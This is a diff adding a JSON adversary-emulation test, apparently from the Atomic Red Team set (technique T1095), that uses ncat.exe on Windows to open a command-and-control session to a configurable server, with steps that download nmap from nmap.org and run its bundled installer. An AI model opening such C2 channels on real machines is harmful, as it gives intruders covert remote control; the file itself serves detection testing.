@@ -1,0 +1,104 @@
+{
+  "id": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37",
+  "name": "Netcat C2",
+  "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p \u003cport\u003e\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ab52460a-041b-4c19-8201-876a79943261",
+      "type": "execute-command",
+      "data": {
+        "command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "db76e444-5622-4b46-afbc-5ee322995b7d",
+      "name": "Check dependency 1/1",
+      "description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0a937880-3c9d-469e-b205-59db983384cf",
+      "name": "Resolve dependency 1/1",
+      "description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory -Force -Path \"#{ncat_path}\" | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1e2cd9e7-f645-4432-b887-c1e534f51877",
+      "name": "Re-check dependency 1/1",
+      "description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "db76e444-5622-4b46-afbc-5ee322995b7d",
+      "p": "on-success",
+      "o": "ab52460a-041b-4c19-8201-876a79943261"
+    },
+    {
+      "s": "db76e444-5622-4b46-afbc-5ee322995b7d",
+      "p": "on-failure",
+      "o": "0a937880-3c9d-469e-b205-59db983384cf"
+    },
+    {
+      "s": "0a937880-3c9d-469e-b205-59db983384cf",
+      "p": "on-success",
+      "o": "1e2cd9e7-f645-4432-b887-c1e534f51877"
+    },
+    {
+      "s": "1e2cd9e7-f645-4432-b887-c1e534f51877",
+      "p": "on-failure",
+      "o": "ab52460a-041b-4c19-8201-876a79943261"
+    }
+  ],
+  "tags": [
+    "T1095",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "server_port",
+      "type": "integer",
+      "description": "The port for the C2 connection",
+      "value": "80"
+    },
+    {
+      "name": "ncat_exe",
+      "type": "path",
+      "description": "The location of ncat.exe",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe"
+    },
+    {
+      "name": "ncat_path",
+      "type": "path",
+      "description": "The folder path of ncat.exe",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095"
+    },
+    {
+      "name": "server_ip",
+      "type": "string",
+      "description": "The IP address or domain name of the listening server",
+      "value": "127.0.0.1"
+    }
+  ]
+}
